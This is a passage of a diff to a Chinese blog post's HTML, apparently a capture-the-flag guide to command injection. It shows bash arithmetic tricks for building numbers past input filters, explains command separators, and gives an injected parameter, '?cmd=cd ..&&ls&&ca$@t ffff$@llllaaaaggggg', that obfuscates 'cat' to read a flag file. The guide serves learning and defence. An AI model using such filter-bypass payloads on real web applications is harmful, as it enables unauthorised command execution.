 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-12-3-ubuntu:~$ echo $((~$(())))</span><br><span class="line">-1</span><br><span class="line">ubuntu@VM-12-3-ubuntu:~$ echo $((~0))</span><br><span class="line">-1</span><br><span class="line">ubuntu@VM-12-3-ubuntu:~$ echo $((~1))</span><br><span class="line">-2</span><br><span class="line">ubuntu@VM-12-3-ubuntu:~$ echo $((~11))</span><br><span class="line">-12</span><br><span class="line">ubuntu@VM-12-3-ubuntu:~$ echo $((1&lt;&lt;1))</span><br><span class="line">2</span><br><span class="line">ubuntu@VM-12-3-ubuntu:~$ echo $((1&lt;&lt;1&lt;&lt;1))</span><br><span class="line">4</span><br><span class="line">ubuntu@VM-12-3-ubuntu:~$ echo $((2#10001))</span><br><span class="line">17</span><br><span class="line">ubuntu@VM-12-3-ubuntu:~$ echo $(( $((1&lt;&lt;1))#10001 ))</span><br><span class="line">17</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h4></li>
+<h3 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h3></li>
 </ol>
 <p><strong>windows</strong>：</p>
 <p>‘|’  在前面命令的结果上，执行后面的指令<br>‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>‘&amp;&amp;’ 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令，例如<code>?cmd=cd ..&amp;&amp;ls&amp;&amp;ca$@t ffff$@llllaaaaggggg</code></p>
@@ -396,7 +398,7 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2023/02/18/common/web%E6%9C%8D%E5%8A%A1%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E4%BA%A4%E6%8D%A2/">web服务中的数据交换</a>
+                <a class="prev" rel="prev" href="/2023/01/10/server/windows%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">windows基础命令</a>
             
             
             <a class="next" rel="next" href="/2022/12/03/bin/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/">汇编基础</a>
